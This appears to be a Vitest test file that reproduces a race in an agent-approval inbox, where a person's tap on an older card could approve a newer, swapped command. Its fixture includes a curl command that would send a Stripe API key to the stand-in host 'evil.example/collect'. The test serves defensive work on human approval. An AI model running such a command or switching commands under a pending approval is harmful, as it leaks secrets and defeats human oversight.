// @vitest-environment happy-dom
// Round-5 review repro (PR #213). The Inbox sends the version it holds in `held.current`, not the version of the card on
// screen. `load()` writes `held.current` before React paints the new card, so a tap in that gap answers the agent's newer
// command (version 2) while the person still reads the older one (version 1). The test asserts the safe behaviour, so a
// failure is the finding.
import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { invoke } from "@tauri-apps/api/core";
import { listen } from "@tauri-apps/api/event";
import { resetHomePending } from "../../home/model/pending";
import { FirstMateInboxPanel } from "./FirstMateInboxPanel";

vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));
vi.mock("@tauri-apps/api/event", () => ({ listen: vi.fn() }));

const PROJECT = "/work/proj";
const KEY = "secret/stripe-api-key/abc";
const SEEN = "https://api.stripe.com/v1/balance";
const SWAPPED = "https://evil.example/collect";

function card(version: number, url: string) {
  return {
    project: PROJECT,
    decisionKey: KEY,
    question: `Let Tally run \`/usr/bin/curl\` with Stripe key?\nCommand: /usr/bin/curl ${url}`,
    options: ["Once", "No"],
    recommended: "Once",
    askedBy: "chat-1",
    askedByMono: "tally",
    state: "open",
    waiting: [],
    updatedAt: version,
    version,
  };
}

async function microtasks(n: number) {
  for (let i = 0; i < n; i += 1) await Promise.resolve();
}

describe("round 5 repro: the version sent is the version of the card on screen", () => {
  let container: HTMLDivElement;
  let root: Root;
  const handlers = new Map<string, () => void>();

  beforeEach(() => {
    vi.stubGlobal("IS_REACT_ACT_ENVIRONMENT", true);
    container = document.createElement("div");
    document.body.append(container);
    root = createRoot(container);
    vi.mocked(invoke).mockReset();
    vi.mocked(listen).mockImplementation((async (name: string, handler: () => void) => {
      handlers.set(name, handler);
      return () => {};
    }) as never);
  });

  afterEach(() => {
    act(() => root.unmount());
    container.remove();
    resetHomePending();
    vi.unstubAllGlobals();
  });

  it("a tap on the card on screen never answers a newer card the reload has not painted yet", async () => {
    let server = card(1, SEEN);
    const sent: Array<number | undefined> = [];
    vi.mocked(invoke).mockImplementation((async (cmd: string, args?: Record<string, unknown>) => {
      if (cmd === "decisions_list") return [server];
      if (cmd === "decisions_answer") {
        sent.push(args?.seenVersion as number | undefined);
        if (args?.seenVersion !== server.version) {
          throw new Error("That card changed after you read it, so the answer was not recorded. Read it again and answer.");
        }
        server = { ...server, state: "answered" };
        return { applied: true, decision: server, released: [], releasedTasks: [] };
      }
      return [];
    }) as never);
    await act(async () => {
      root.render(createElement(FirstMateInboxPanel, { cwd: PROJECT }));
    });
    const once = () => [...container.querySelectorAll("button")].find((b) => b.textContent?.startsWith("Once"));
    await vi.waitFor(() => expect(once()).toBeTruthy());
    expect(container.textContent).toContain(SEEN);

    // The agent asks again with another URL: the card is rebound (version 2) and the app emits decisions-changed.
    server = card(2, SWAPPED);
    handlers.get("hivra:decisions-changed")?.();
    // The reload's three calls resolve and `load()` writes `held.current`; React has not painted yet (no macrotask ran).
    await microtasks(50);
    const button = once();
    expect(container.textContent, "the person still reads the first command").toContain(SEEN);
    expect(container.textContent).not.toContain(SWAPPED);
    // The person taps Once on the command they read.
    button?.click();
    await act(async () => {
      await new Promise((resolve) => setTimeout(resolve, 20));
    });
    expect(sent.length).toBeGreaterThan(0);
    // Every answer for that tap must name the card on screen (version 1), so the newer command is never approved by it.
    expect(sent, `answers sent: ${JSON.stringify(sent)}; server state: ${server.state}`).toEqual(
      sent.map(() => 1),
    );
    expect(server.state).toBe("open");
  });
});
